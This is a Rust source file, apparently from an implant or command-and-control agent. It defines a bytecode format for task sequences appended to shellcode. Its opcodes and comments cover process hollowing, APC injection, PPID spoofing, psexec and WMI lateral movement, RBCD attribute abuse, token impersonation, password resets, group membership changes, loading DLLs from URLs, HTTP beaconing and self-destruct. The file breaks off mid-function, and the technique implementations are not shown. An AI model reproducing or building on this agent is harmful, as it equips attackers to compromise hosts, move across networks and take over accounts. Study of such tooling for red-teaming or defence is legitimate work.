//! Bytecode task sequencing system
//!
//! Format: [opcode:u8][num_args:u8][len1:u16 LE][arg1...][len2:u16 LE][arg2...]...[0x00 END]
//!
//! Each argument has its own length prefix (u16 LE).
//! Special length values indicate references instead of literal data:
//!   - 0xFFFF (65535): Variable reference, next 2 bytes are var_id:u16 LE
//!   - 0xFFFD (65533): Constant reference, next 2 bytes are const_idx:u16 LE
//!   - Other values: Literal data of that length (max 65532 bytes)
//!
//! Append bytecode after the shellcode binary to define task sequences.

use alloc::collections::BTreeMap;
use alloc::string::String;
use alloc::vec::Vec;

/// Special length value indicating a variable reference
pub const VAR_REF_LEN: u16 = 0xFFFF;
/// Special length value indicating a constant reference
pub const CONST_REF_LEN: u16 = 0xFFFD;
/// Maximum literal argument size (65532 bytes)
pub const MAX_LITERAL_LEN: u16 = 0xFFFC;

/// Argument type - either a literal value or a reference
#[derive(Debug, Clone)]
pub enum Arg {
    /// Literal byte data
    Literal(Vec<u8>),
    /// Reference to a stored variable (by var_id)
    Var(u16),
    /// Reference to a constant (by const_idx)
    Const(u16),
}

impl Default for Arg {
    fn default() -> Self {
        Arg::Literal(Vec::new())
    }
}

/// Opcode definitions
#[repr(u8)]
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Opcode {
    /// End of sequence
    End = 0x00,
    /// Store last result to variable. Args: [var_id: u16 LE]
    StoreResult = 0x01,
    /// Get shellcode bytes. Args: [task:u8?][magic:u32?] (both optional)
    GetShellcode = 0x02,
    /// Sleep N milliseconds. Args: [duration_ms: u32 LE]
    Sleep = 0x03,
    /// Run command. Args: [command bytes...]
    #[cfg(feature = "execution")]
    RunCommand = 0x04,
    /// Get current working directory. Args: none
    #[cfg(feature = "filesystem")]
    GetCwd = 0x05,
    /// Read file. Args: [path bytes...]
    #[cfg(feature = "filesystem")]
    ReadFile = 0x06,
    /// Write file. Args: [path_len: u16 LE][path: bytes][content: remaining bytes]
    #[cfg(feature = "filesystem")]
    WriteFile = 0x07,
    /// Check if var has error, print status code. Args: [var_id: u16 LE]
    CheckError = 0x08,
    /// Conditional jump. Args: [mode:u8][var1:u16][var2?:u16][true_idx:u16][false_idx:u16]
    /// mode=0x00 data check: 1 var = has data?, 2 vars = data equal?
    /// mode=0x01 error check: 1 var = error==0?, 2 vars = errors equal?
    /// 7 bytes = single var, 9 bytes = two vars
    Conditional = 0x09,
    /// Set var with data. Args: [var_id:u16][data...]
    SetVar = 0x0A,
    /// Print var contents for debugging. Args: [var_id:u16]
    PrintVar = 0x0B,
    /// Unconditional jump. Args: [target_idx:u16]
    Goto = 0x0C,
    /// Migrate to process matching search string. Args: [task_id:u8][search_str:bytes][magic:u32?]
    /// Searches "image cmdline" for match. task_id 0xFF = same task. magic is optional.
    #[cfg(feature = "execution")]
    Migrate = 0x0D,
    /// List processes. Args: none. Returns pid\tppid\timage\tcmdline\n
    #[cfg(feature = "enumerate")]
    ListProcs = 0x0E,
    /// Get constant by index. Args: [const_idx: u16]
    GetConst = 0x0F,
    /// Execute command via WMI. Args: [command:bytes][host:bytes][user:bytes][pass:bytes]
    /// Empty host/user/pass = local/current creds
    #[cfg(feature = "execution")]
    WmiExec = 0x10,
    /// HTTP request. Args: [method:bytes][host:bytes][port:u16][path:bytes][secure:u8][body:bytes]
    #[cfg(feature = "network")]
    HttpSend = 0x11,
    /// Sacrificial process. Args: [image:bytes][task_id:u8][search:bytes?][pipe_name:bytes?]
    /// Spawns image with shellcode, PPID spoofed to process matching search (optional)
    /// If pipe_name provided, redirects stdout to named pipe and reads output
    #[cfg(feature = "execution")]
    Sacrificial = 0x12,
    /// Redirect stdout to file or named pipe. Args: [path:bytes]
    /// Auto-detects: \\.\pipe\* = pipe (OPEN_EXISTING), else file (CREATE_ALWAYS)
    #[cfg(feature = "filesystem")]
    RedirectStdout = 0x13,
    /// Start shellcode server listening on port. Args: [port:u16][magic_base:u32?]
    /// Blocks until connection received and shellcode executed
    /// If magic_base provided, increments magic u32 on each request
    #[cfg(all(feature = "network", feature = "payload_gen"))]
    ShellcodeServer = 0x14,
    /// Resolve hostname to IP address. Args: [hostname:bytes]
    /// Returns IPv4 address as u32
    #[cfg(feature = "network")]
    ResolveHostname = 0x15,
    /// Psexec. Args: [target:bytes][service_name:bytes][display_name:bytes][binary_path:bytes][service_bin:bytes]
    #[cfg(feature = "lateral_movement")]
    Psexec = 0x16,
    /// Generate EXE with shellcode. Args: [task_id:u8]
    /// Returns EXE bytes in last_result
    #[cfg(feature = "payload_gen")]
    GenerateExe = 0x17,
    /// Run BOF (Beacon Object File). Args: [bof_data:bytes][entry:bytes][inputs:bytes]
    /// Returns BOF output string in last_result
    #[cfg(feature = "bof")]
    RunBof = 0x18,
    /// Query LDAP. Args: [base:bytes][filter:bytes][scope:u8][attribute:bytes]
    /// Returns query results in last_result
    #[cfg(feature = "ad")]
    QueryLdap = 0x19,
    /// Set AD attribute (string). Args: [dn:bytes][attr:bytes][value:bytes]
    #[cfg(feature = "ad")]
    SetAdAttrStr = 0x1A,
    /// Set AD attribute (binary). Args: [dn:bytes][attr:bytes][value:bytes]
    #[cfg(feature = "ad")]
    SetAdAttrBin = 0x1B,
    /// Port scan. Args: [targets:bytes][ports:bytes]
    /// Returns "host\tport\tbanner\n" lines
    #[cfg(feature = "network")]
    PortScan = 0x1C,
    /// Set user password. Args: [server:bytes][username:bytes][password:bytes]
    #[cfg(feature = "user")]
    SetUserPassword = 0x1D,
    /// Add user to local group. Args: [server:bytes][group:bytes][username:bytes]
    #[cfg(feature = "user")]
    AddUserToLocalGroup = 0x1E,
    /// Remove user from local group. Args: [server:bytes][group:bytes][username:bytes]
    #[cfg(feature = "user")]
    RemoveUserFromLocalGroup = 0x1F,
    /// Get user SID. Args: [server:bytes][username:bytes]
    #[cfg(feature = "user")]
    GetUserSid = 0x20,
    /// Add user to domain group. Args: [server:bytes][group:bytes][username:bytes]
    #[cfg(feature = "user")]
    AddUserToGroup = 0x21,
    /// Remove user from domain group. Args: [server:bytes][group:bytes][username:bytes]
    #[cfg(feature = "user")]
    RemoveUserFromGroup = 0x22,
    /// Create RBCD ACE. Args: [sid:bytes]
    #[cfg(feature = "ad")]
    CreateRbcdAce = 0x23,
    /// Create registry key. Args: [key:bytes]
    #[cfg(feature = "registry")]
    RegCreateKey = 0x24,
    /// Delete registry key. Args: [key:bytes]
    #[cfg(feature = "registry")]
    RegDeleteKey = 0x25,
    /// Set registry value. Args: [key:bytes][value_name:bytes][value_type:bytes][value:bytes]
    #[cfg(feature = "registry")]
    RegSetValue = 0x26,
    /// Query registry value. Args: [key:bytes][value_name:bytes]
    #[cfg(feature = "registry")]
    RegQueryValue = 0x27,
    /// Make token (logon). Args: [domain:bytes][username:bytes][password:bytes][logon_type:u8?]
    #[cfg(feature = "priv")]
    MakeToken = 0x28,
    /// Impersonate process. Args: [search:bytes] - finds process by image/cmdline
    #[cfg(feature = "priv")]
    ImpersonateProcess = 0x29,
    /// Enable privilege on process. Args: [search:bytes][priv_name:bytes] - empty search = current
    #[cfg(feature = "priv")]
    EnablePrivilege = 0x2A,
    /// List process privileges. Args: [search:bytes] - empty search = current
    #[cfg(feature = "priv")]
    ListProcessPrivs = 0x2B,
    /// List current thread privileges. Args: none
    #[cfg(feature = "priv")]
    ListThreadPrivs = 0x2C,
    /// Delete a file. Args: [path:bytes]
    #[cfg(feature = "filesystem")]
    DeleteFile = 0x2D,
    /// Revert to self (stop impersonation). Args: none
    #[cfg(feature = "priv")]
    RevertToSelf = 0x2E,
    /// Start a service. Args: [target:bytes][service_name:bytes]
    #[cfg(feature = "services")]
    StartService = 0x2F,
    /// Delete a service. Args: [target:bytes][service_name:bytes]
    #[cfg(feature = "services")]
    DeleteService = 0x30,
    /// Create thread in current process. Args: [task_id:u8?][magic:u32?]
    /// If magic not provided, auto-finds non-colliding value by scanning heaps.
    #[cfg(feature = "execution")]
    CreateThread = 0x31,
    /// Generate DLL with shellcode. Args: [task_id:u8][export_name:bytes]
    #[cfg(feature = "payload_gen")]
    GenerateDll = 0x32,
    /// Shell execute via COM. Args: [path:bytes][verb:bytes][args:bytes]
    #[cfg(feature = "execution")]
    ShellExecute = 0x33,
    /// Shell extract ZIP (creates folder from zip name). Args: [zip_path:bytes]
    #[cfg(feature = "execution")]
    ShellExtract = 0x34,
    /// Shell execute via explorer.exe (parent is explorer). Args: [path:bytes][verb:bytes][args:bytes]
    #[cfg(feature = "execution")]
    ShellExecuteExplorer = 0x35,
    /// Load a DLL via LoadLibraryW. Args: [path:bytes]
    #[cfg(feature = "payload_gen")]
    LoadLibrary = 0x36,
    /// Load Python DLL from URL and execute script. Args: [url:bytes][script:bytes]
    #[cfg(all(feature = "python", feature = "network"))]
    PyExec = 0x37,
    /// Process hollowing with JMP stub. Args: [image:bytes][task_id:u8][search:bytes?]
    /// Spawns image suspended, allocates shellcode, writes JMP stub at entry point.
    /// If search provided, spoofs PPID to process matching search.
    #[cfg(feature = "execution")]
    Hollow = 0x38,
    /// APC injection. Args: [image:bytes][task_id:u8][magic:u32?]
    /// Spawns image suspended, allocates RWX memory, writes shellcode, queues APC, resumes.
    /// Returns the spawned process PID.
    #[cfg(feature = "execution")]
    MigrateApc = 0x39,
    /// Register as a Windows service. Args: [service_name:bytes]
    /// Spawns a thread to handle SCM communication so the main thread can continue.
    #[cfg(feature = "services")]
    RegisterService = 0x3A,
    /// Exit the current process. Args: [exit_code:u32]
    /// Calls ExitProcess to cleanly terminate the process.
    ExitProcess = 0x3B,
    /// Process hollowing with APC. Args: [image:bytes][task_id:u8][search:bytes?]
    /// Spawns image suspended, allocates shellcode, queues APC to run it.
    /// If search provided, spoofs PPID to process matching search.
    #[cfg(feature = "execution")]
    HollowApc = 0x3C,
    /// Frida hook - load Frida DLL and install JavaScript hook. Args: [url:bytes][script:bytes][callback_host:bytes?][callback_port:u16?]
    /// Downloads Frida DLL from URL, reflectively loads it, and installs the script.
    /// If callback_host and callback_port provided, sends messages via HTTP POST.
    #[cfg(feature = "frida")]
    FridaHook = 0x3F,
    /// Frida unhook - unload a previously installed hook. Args: [hook_id:i32]
    /// Pass the hook ID returned by frida_hook to unload it.
    #[cfg(feature = "frida")]
    FridaUnhook = 0x40,
    /// Kill an agent. No args = self-destruct. With magic = kill agent with that magic.
    /// Args: [magic:u32?]
    Kill = 0x42,
    /// HTTP beacon - poll server for tasks and post results.
    /// Args: [host:bytes][port:u16][interval_ms:u32][secure:bool]
    #[cfg(feature = "c2")]
    HttpBeacon = 0x43,
    /// Read memory at address. Args: [address:hex_str][size:u32_LE][pid:u32_LE?]
    /// Returns the raw bytes read from the specified memory address.
    MemRead = 0x44,
    /// List loaded DLLs from PEB LDR. Args: [pid:u32_LE?]
    /// Returns base\tsize\tpath\n per module.
    #[cfg(feature = "mal")]
    DllList = 0x45,
    /// Enumerate virtual memory regions. Args: [pid:u32_LE?]
    /// Returns addr\tsize\tstate\tprotect\talloc_protect\ttype\tinfo\n per region.
    #[cfg(feature = "mal")]
    MemMap = 0x46,
    /// Find executable private memory (injected code). Args: [pid:u32_LE?]
    #[cfg(feature = "mal")]
    Malfind = 0x47,
    /// Cross-reference IMAGE regions against PEB module lists. Args: [pid:u32_LE?]
    #[cfg(feature = "mal")]
    LdrCheck = 0x48,
}

impl From<u8> for Opcode {
    fn from(byte: u8) -> Self {
        match byte {
            0x00 => Opcode::End,
            0x01 => Opcode::StoreResult,
            0x02 => Opcode::GetShellcode,
            0x03 => Opcode::Sleep,
            #[cfg(feature = "execution")]
            0x04 => Opcode::RunCommand,
            #[cfg(feature = "filesystem")]
            0x05 => Opcode::GetCwd,
            #[cfg(feature = "filesystem")]
            0x06 => Opcode::ReadFile,
            #[cfg(feature = "filesystem")]
            0x07 => Opcode::WriteFile,
            0x08 => Opcode::CheckError,
            0x09 => Opcode::Conditional,
            0x0A => Opcode::SetVar,
            0x0B => Opcode::PrintVar,
            0x0C => Opcode::Goto,
            #[cfg(feature = "execution")]
            0x0D => Opcode::Migrate,
            #[cfg(feature = "enumerate")]
            0x0E => Opcode::ListProcs,
            0x0F => Opcode::GetConst,
            #[cfg(feature = "execution")]
            0x10 => Opcode::WmiExec,
            #[cfg(feature = "network")]
            0x11 => Opcode::HttpSend,
            #[cfg(feature = "execution")]
            0x12 => Opcode::Sacrificial,
            #[cfg(feature = "filesystem")]
            0x13 => Opcode::RedirectStdout,
            #[cfg(all(feature = "network", feature = "payload_gen"))]
            0x14 => Opcode::ShellcodeServer,
            #[cfg(feature = "network")]
            0x15 => Opcode::ResolveHostname,
            #[cfg(feature = "lateral_movement")]
            0x16 => Opcode::Psexec,
            #[cfg(feature = "payload_gen")]
            0x17 => Opcode::GenerateExe,
            #[cfg(feature = "bof")]
            0x18 => Opcode::RunBof,
            #[cfg(feature = "ad")]
            0x19 => Opcode::QueryLdap,
            #[cfg(feature = "ad")]
            0x1A => Opcode::SetAdAttrStr,
            #[cfg(feature = "ad")]
            0x1B => Opcode::SetAdAttrBin,
            #[cfg(feature = "network")]
            0x1C => Opcode::PortScan,
            #[cfg(feature = "user")]
            0x1D => Opcode::SetUserPassword,
            #[cfg(feature = "user")]
            0x1E => Opcode::AddUserToLocalGroup,
            #[cfg(feature = "user")]
            0x1F => Opcode::RemoveUserFromLocalGroup,
            #[cfg(feature = "user")]
            0x20 => Opcode::GetUserSid,
            #[cfg(feature = "user")]
            0x21 => Opcode::AddUserToGroup,
            #[cfg(feature = "user")]
            0x22 => Opcode::RemoveUserFromGroup,
            #[cfg(feature = "ad")]
            0x23 => Opcode::CreateRbcdAce,
            #[cfg(feature = "registry")]
            0x24 => Opcode::RegCreateKey,
            #[cfg(feature = "registry")]
            0x25 => Opcode::RegDeleteKey,
            #[cfg(feature = "registry")]
            0x26 => Opcode::RegSetValue,
            #[cfg(feature = "registry")]
            0x27 => Opcode::RegQueryValue,
            #[cfg(feature = "priv")]
            0x28 => Opcode::MakeToken,
            #[cfg(feature = "priv")]
            0x29 => Opcode::ImpersonateProcess,
            #[cfg(feature = "priv")]
            0x2A => Opcode::EnablePrivilege,
            #[cfg(feature = "priv")]
            0x2B => Opcode::ListProcessPrivs,
            #[cfg(feature = "priv")]
            0x2C => Opcode::ListThreadPrivs,
            #[cfg(feature = "filesystem")]
            0x2D => Opcode::DeleteFile,
            #[cfg(feature = "priv")]
            0x2E => Opcode::RevertToSelf,
            #[cfg(feature = "services")]
            0x2F => Opcode::StartService,
            #[cfg(feature = "services")]
            0x30 => Opcode::DeleteService,
            #[cfg(feature = "execution")]
            0x31 => Opcode::CreateThread,
            #[cfg(feature = "payload_gen")]
            0x32 => Opcode::GenerateDll,
            #[cfg(feature = "execution")]
            0x33 => Opcode::ShellExecute,
            #[cfg(feature = "execution")]
            0x34 => Opcode::ShellExtract,
            #[cfg(feature = "execution")]
            0x35 => Opcode::ShellExecuteExplorer,
            #[cfg(feature = "payload_gen")]
            0x36 => Opcode::LoadLibrary,
            #[cfg(all(feature = "python", feature = "network"))]
            0x37 => Opcode::PyExec,
            #[cfg(feature = "execution")]
            0x38 => Opcode::Hollow,
            #[cfg(feature = "execution")]
            0x39 => Opcode::MigrateApc,
            #[cfg(feature = "services")]
            0x3A => Opcode::RegisterService,
            0x3B => Opcode::ExitProcess,
            #[cfg(feature = "execution")]
            0x3C => Opcode::HollowApc,
            #[cfg(feature = "frida")]
            0x3F => Opcode::FridaHook,
            #[cfg(feature = "frida")]
            0x40 => Opcode::FridaUnhook,
            0x42 => Opcode::Kill,
            #[cfg(feature = "c2")]
            0x43 => Opcode::HttpBeacon,
            0x44 => Opcode::MemRead,
            #[cfg(feature = "mal")]
            0x45 => Opcode::DllList,
            #[cfg(feature = "mal")]
            0x46 => Opcode::MemMap,
            #[cfg(feature = "mal")]
            0x47 => Opcode::Malfind,
            #[cfg(feature = "mal")]
            0x48 => Opcode::LdrCheck,
            _ => Opcode::End, // treat unknown as end
        }
    }
}

/// Variable storage - up to 65536 slots indexed by u16
pub struct VarStore {
    vars: BTreeMap<u16, Vec<u8>>,
}

impl VarStore {
    pub fn new() -> Self {
        Self {
            vars: BTreeMap::new(),
        }
    }

    pub fn set(&mut self, id: u16, data: Vec<u8>) {
        self.vars.insert(id, data);
    }

    pub fn get(&self, id: u16) -> Option<&Vec<u8>> {
        self.vars.get(&id)
    }

    pub fn clear(&mut self, id: u16) {
        self.vars.remove(&id);
    }
}

/// Resolve an Arg to its byte contents
/// - Literal: returns the data as-is
/// - Var: looks up in vars, skips 4-byte status prefix
/// - Const: looks up in constants
pub fn resolve_arg(arg: &Arg, vars: &VarStore, constants: &[Vec<u8>]) -> Vec<u8> {
    match arg {
        Arg::Literal(data) => data.clone(),
        Arg::Var(var_id) => {
            if let Some(var_data) = vars.get(*var_id) {
                if var_data.len() > 5 {
                    var_data[5..].to_vec()  // Skip 5-byte opcode+status prefix
                } else {
                    Vec::new()
                }
            } else {
                Vec::new()
            }
        }
        Arg::Const(const_idx) => {
            if let Some(const_data) = constants.get(*const_idx as usize) {
                const_data.clone()
            } else {
                Vec::new()
            }
        }
    }
}

/// Bytecode reader for parsing task sequences from memory
pub struct BytecodeReader {
    base: *const u8,
    pos: usize,
}

impl BytecodeReader {
    /// Create reader from shellcode data pointer (appended data)
    /// Skips the first 5 bytes: version (1) + size (4)
    pub fn from_shellcode_data() -> Self {
        let ptr = crate::libs::utils::get_shellcode_data_ptr();
        Self {
            base: ptr as *const u8,
            pos: 5,  // Skip version byte + u32 size prefix
        }
    }

    /// Create from raw pointer
    pub fn new(ptr: *const u8) -> Self {
        Self { base: ptr, pos: 0 }
    }

    /// Get current position
    pub fn position(&self) -> usize {
        self.pos
    }

    /// Read a single byte
    pub fn read_u8(&mut self) -> u8 {
        unsafe {
            let val = *self.base.add(self.pos);
            self.pos += 1;
            val
        }
    }

    /// Read u16 little-endian
    pub fn read_u16_le(&mut self) -> u16 {
        let lo = self.read_u8() as u16;
        let hi = self.read_u8() as u16;
        lo | (hi << 8)
    }

    /// Read u32 little-endian
    pub fn read_u32_le(&mut self) -> u32 {
        let b0 = self.read_u8() as u32;
        let b1 = self.read_u8() as u32;
        let b2 = self.read_u8() as u32;
        let b3 = self.read_u8() as u32;
        b0 | (b1 << 8) | (b2 << 16) | (b3 << 24)
    }

    /// Read N bytes into a Vec
    pub fn read_bytes(&mut self, n: usize) -> Vec<u8> {
        let mut buf = Vec::with_capacity(n);
        for _ in 0..n {
            buf.push(self.read_u8());
        }
        buf
    }

    /// Read null-terminated string
    pub fn read_cstr(&mut self) -> String {
        let start = self.pos;
        unsafe {
            while *self.base.add(self.pos) != 0 {
                self.pos += 1;
            }
        }
        let len = self.pos - start;
        let bytes = unsafe { core::slice::from_raw_parts(self.base.add(start), len) };
        self.pos += 1; // skip null
        String::from_utf8_lossy(bytes).into_owned()
    }

    /// Read opcode
    pub fn read_opcode(&mut self) -> Opcode {
        Opcode::from(self.read_u8())
    }

    /// Skip N bytes
    pub fn skip(&mut self, n: usize) {
        self.pos += n;
    }

    /// Get pointer at current position
    pub fn current_ptr(&self) -> *const u8 {
        unsafe { self.base.add(self.pos) }
    }

    /// Read all arguments: [num_args:u8][len1:u16][arg1...][len2:u16][arg2...]...
    /// Special length values:
    ///   - 0xFFFF: Variable reference, next 2 bytes are var_id
    ///   - 0xFFFD: Constant reference, next 2 bytes are const_idx
    ///   - Other: Literal data of that length
    pub fn read_args(&mut self) -> Vec<Arg> {
        let num_args = self.read_u8();
        let mut args = Vec::with_capacity(num_args as usize);
        for _ in 0..num_args {
            let len = self.read_u16_le();
            match len {
                VAR_REF_LEN => {
                    let var_id = self.read_u16_le();
                    args.push(Arg::Var(var_id));
                }
                CONST_REF_LEN => {
                    let const_idx = self.read_u16_le();
                    args.push(Arg::Const(const_idx));
                }
                _ => {
                    let data = self.read_bytes(len as usize);
                    args.push(Arg::Literal(data));
                }
            }
        }
        args
    }
}

/// Parsed task with arguments
/// Fields that can be var/const references use the Arg type
/// Order matches Opcode values: 0x00-0x18
pub enum Task {
    End,                                    // 0x00
    StoreResult { var_id: u16 },            // 0x01
    GetShellcode { task: Arg, magic: Arg }, // 0x02 - both optional
    Sleep { duration_ms: u32 },             // 0x03
    #[cfg(feature = "execution")]
    RunCommand { command: Arg },            // 0x04
    #[cfg(feature = "filesystem")]
    GetCwd,                                 // 0x05
    #[cfg(feature = "filesystem")]
    ReadFile { path: Arg },                 // 0x06
    #[cfg(feature = "filesystem")]
    WriteFile { path: Arg, content: Arg },  // 0x07
    CheckError { var_id: u16 },             // 0x08
    Conditional {                           // 0x09
        mode: u8,           // 0x00 = data check, 0x01 = error check
        var1: u16,
        var2: Option<u16>,  // None = single var check, Some = compare two vars
        true_idx: u16,
        false_idx: u16,
    },
    SetVar { var_id: u16, data: Arg },      // 0x0A
    PrintVar { var_id: Option<u16> },       // 0x0B - None = print last_result
    Goto { target_idx: u16 },               // 0x0C
    #[cfg(feature = "execution")]
    Migrate { task_id: Option<u8>, search: Arg, magic: Option<Arg> }, // 0x0D
    #[cfg(feature = "enumerate")]
    ListProcs,                              // 0x0E
    GetConst { const_idx: u16 },            // 0x0F
    #[cfg(feature = "execution")]
    WmiExec { command: Arg, host: Arg, user: Arg, pass: Arg, domain: Arg }, // 0x10
    #[cfg(feature = "network")]
    HttpSend { method: Arg, host: Arg, port: Arg, path: Arg, secure: Arg, body: Arg }, // 0x11
    #[cfg(feature = "execution")]
    Sacrificial { image: Arg, task_id: Arg, pipe_name: Option<Arg>, search: Option<Arg>, no_kill: Option<Arg> }, // 0x12
    #[cfg(feature = "filesystem")]
    RedirectStdout { path: Arg },           // 0x13
    #[cfg(all(feature = "network", feature = "payload_gen"))]
    ShellcodeServer { port: Arg, magic_base: Option<Arg> }, // 0x14
    #[cfg(feature = "network")]
    ResolveHostname { hostname: Arg },      // 0x15
    #[cfg(feature = "lateral_movement")]
    Psexec { target: Arg, service_name: Arg, display_name: Arg, binary_path: Arg, service_bin: Arg }, // 0x16
    #[cfg(feature = "payload_gen")]
    GenerateExe { task_id: Arg },           // 0x17
    #[cfg(feature = "bof")]
    RunBof { bof_data: Arg, entry: Arg, inputs: Arg }, // 0x18
    #[cfg(feature = "ad")]
    QueryLdap { base: Arg, filter: Arg, scope: Arg, attribute: Arg }, // 0x19
    #[cfg(feature = "ad")]
    SetAdAttrStr { dn: Arg, attr: Arg, value: Arg }, // 0x1A
    #[cfg(feature = "ad")]
    SetAdAttrBin { dn: Arg, attr: Arg, value: Arg }, // 0x1B
    #[cfg(feature = "network")]
    PortScan { targets: Arg, ports: Arg }, // 0x1C
    #[cfg(feature = "user")]
    SetUserPassword { server: Arg, username: Arg, password: Arg }, // 0x1D
    #[cfg(feature = "user")]
    AddUserToLocalGroup { server: Arg, group: Arg, username: Arg }, // 0x1E
    #[cfg(feature = "user")]
    RemoveUserFromLocalGroup { server: Arg, group: Arg, username: Arg }, // 0x1F
    #[cfg(feature = "user")]
    GetUserSid { server: Arg, username: Arg }, // 0x20
    #[cfg(feature = "user")]
    AddUserToGroup { server: Arg, group: Arg, username: Arg }, // 0x21
    #[cfg(feature = "user")]
    RemoveUserFromGroup { server: Arg, group: Arg, username: Arg }, // 0x22
    #[cfg(feature = "ad")]
    CreateRbcdAce { sid: Arg }, // 0x23
    #[cfg(feature = "registry")]
    RegCreateKey { key: Arg }, // 0x24
    #[cfg(feature = "registry")]
    RegDeleteKey { key: Arg }, // 0x25
    #[cfg(feature = "registry")]
    RegSetValue { key: Arg, value_name: Arg, value_type: Arg, value: Arg }, // 0x26
    #[cfg(feature = "registry")]
    RegQueryValue { key: Arg, value_name: Arg }, // 0x27
    #[cfg(feature = "priv")]
    MakeToken { domain: Arg, username: Arg, password: Arg, logon_type: Option<Arg> }, // 0x28
    #[cfg(feature = "priv")]
    ImpersonateProcess { search: Arg }, // 0x29
    #[cfg(feature = "priv")]
    EnablePrivilege { search: Arg, priv_name: Arg }, // 0x2A
    #[cfg(feature = "priv")]
    ListProcessPrivs { search: Arg }, // 0x2B
    #[cfg(feature = "priv")]
    ListThreadPrivs, // 0x2C
    #[cfg(feature = "filesystem")]
    DeleteFile { path: Arg }, // 0x2D
    #[cfg(feature = "priv")]
    RevertToSelf, // 0x2E
    #[cfg(feature = "services")]
    StartService { target: Arg, service_name: Arg }, // 0x2F
    #[cfg(feature = "services")]
    DeleteService { target: Arg, service_name: Arg }, // 0x30
    #[cfg(feature = "execution")]
    CreateThread { task: Arg, magic: Arg }, // 0x31 - both optional
    #[cfg(feature = "payload_gen")]
    GenerateDll { task: Arg, export_name: Arg }, // 0x32
    #[cfg(feature = "execution")]
    ShellExecute { path: Arg, verb: Arg, args: Arg }, // 0x33
    #[cfg(feature = "execution")]
    ShellExtract { zip_path: Arg }, // 0x34
    #[cfg(feature = "execution")]
    ShellExecuteExplorer { path: Arg, verb: Arg, args: Arg }, // 0x35
    #[cfg(feature = "payload_gen")]
    LoadLibrary { path: Arg }, // 0x36
    #[cfg(all(feature = "python", feature = "network"))]
    PyExec { url: Arg, script: Arg }, // 0x37
    #[cfg(feature = "execution")]
    Hollow { image: Arg, task_id: Arg, search: Option<Arg> }, // 0x38
    #[cfg(feature = "execution")]
    MigrateApc { image: Arg, task_id: Arg, magic: Option<Arg> }, // 0x39
    #[cfg(feature = "services")]
    RegisterService { service_name: Arg }, // 0x3A
    ExitProcess { exit_code: Arg }, // 0x3B
    #[cfg(feature = "execution")]
    HollowApc { image: Arg, task_id: Arg, search: Option<Arg> }, // 0x3C
    #[cfg(feature = "frida")]
    FridaHook { url: Arg, script: Arg, name: Option<Arg>, callback_host: Option<Arg>, callback_port: Option<Arg>, batch_size: Option<Arg>, flush_interval: Option<Arg> }, // 0x3F
    #[cfg(feature = "frida")]
    FridaUnhook { hook_id: Option<Arg>, name: Option<Arg> }, // 0x40 - no args = unhook all
    Kill { magic: Option<Arg> }, // 0x42 - no arg = self-destruct, with magic = kill that agent
    #[cfg(feature = "c2")]
    HttpBeacon { host: Arg, port: Arg, interval: Arg, secure: Option<Arg>, agent_id: Option<Arg> }, // 0x43
    MemRead { address: Arg, size: Arg, pid: Option<Arg> }, // 0x44
    #[cfg(feature = "mal")]
    DllList { pid: Option<Arg> }, // 0x45
    #[cfg(feature = "mal")]
    MemMap { pid: Option<Arg> }, // 0x46
    #[cfg(feature = "mal")]
    Malfind { pid: Option<Arg> }, // 0x47
    #[cfg(feature = "mal")]
    LdrCheck { pid: Option<Arg> }, // 0x48
}

impl Task {
    /// Get the opcode byte for this task (for result tagging)
    pub fn opcode(&self) -> u8 {
        match self {
            Task::End => Opcode::End as u8,
            Task::StoreResult { .. } => Opcode::StoreResult as u8,
            Task::GetShellcode { .. } => Opcode::GetShellcode as u8,
            Task::Sleep { .. } => Opcode::Sleep as u8,
            #[cfg(feature = "execution")]
            Task::RunCommand { .. } => Opcode::RunCommand as u8,
            #[cfg(feature = "filesystem")]
            Task::GetCwd => Opcode::GetCwd as u8,
            #[cfg(feature = "filesystem")]
            Task::ReadFile { .. } => Opcode::ReadFile as u8,
            #[cfg(feature = "filesystem")]
            Task::WriteFile { .. } => Opcode::WriteFile as u8,
            Task::CheckError { .. } => Opcode::CheckError as u8,
            Task::Conditional { .. } => Opcode::Conditional as u8,
            Task::SetVar { .. } => Opcode::SetVar as u8,
            Task::PrintVar { .. } => Opcode::PrintVar as u8,
            Task::Goto { .. } => Opcode::Goto as u8,
            #[cfg(feature = "execution")]
            Task::Migrate { .. } => Opcode::Migrate as u8,
            #[cfg(feature = "enumerate")]
            Task::ListProcs => Opcode::ListProcs as u8,
            Task::GetConst { .. } => Opcode::GetConst as u8,
            #[cfg(feature = "execution")]
            Task::WmiExec { .. } => Opcode::WmiExec as u8,
            #[cfg(feature = "network")]
            Task::HttpSend { .. } => Opcode::HttpSend as u8,
            #[cfg(feature = "execution")]
            Task::Sacrificial { .. } => Opcode::Sacrificial as u8,
            #[cfg(feature = "filesystem")]
            Task::RedirectStdout { .. } => Opcode::RedirectStdout as u8,
            #[cfg(all(feature = "network", feature = "payload_gen"))]
            Task::ShellcodeServer { .. } => Opcode::ShellcodeServer as u8,
            #[cfg(feature = "network")]
            Task::ResolveHostname { .. } => Opcode::ResolveHostname as u8,
            #[cfg(feature = "lateral_movement")]
            Task::Psexec { .. } => Opcode::Psexec as u8,
            #[cfg(feature = "payload_gen")]
            Task::GenerateExe { .. } => Opcode::GenerateExe as u8,
            #[cfg(feature = "bof")]
            Task::RunBof { .. } => Opcode::RunBof as u8,
            #[cfg(feature = "ad")]
            Task::QueryLdap { .. } => Opcode::QueryLdap as u8,
            #[cfg(feature = "ad")]
            Task::SetAdAttrStr { .. } => Opcode::SetAdAttrStr as u8,
            #[cfg(feature = "ad")]
            Task::SetAdAttrBin { .. } => Opcode::SetAdAttrBin as u8,
            #[cfg(feature = "network")]
            Task::PortScan { .. } => Opcode::PortScan as u8,
            #[cfg(feature = "user")]
            Task::SetUserPassword { .. } => Opcode::SetUserPassword as u8,
            #[cfg(feature = "user")]
            Task::AddUserToLocalGroup { .. } => Opcode::AddUserToLocalGroup as u8,
            #[cfg(feature = "user")]
            Task::RemoveUserFromLocalGroup { .. } => Opcode::RemoveUserFromLocalGroup as u8,
            #[cfg(feature = "user")]
            Task::GetUserSid { .. } => Opcode::GetUserSid as u8,
            #[cfg(feature = "user")]
            Task::AddUserToGroup { .. } => Opcode::AddUserToGroup as u8,
            #[cfg(feature = "user")]
            Task::RemoveUserFromGroup { .. } => Opcode::RemoveUserFromGroup as u8,
            #[cfg(feature = "ad")]
            Task::CreateRbcdAce { .. } => Opcode::CreateRbcdAce as u8,
            #[cfg(feature = "registry")]
            Task::RegCreateKey { .. } => Opcode::RegCreateKey as u8,
            #[cfg(feature = "registry")]
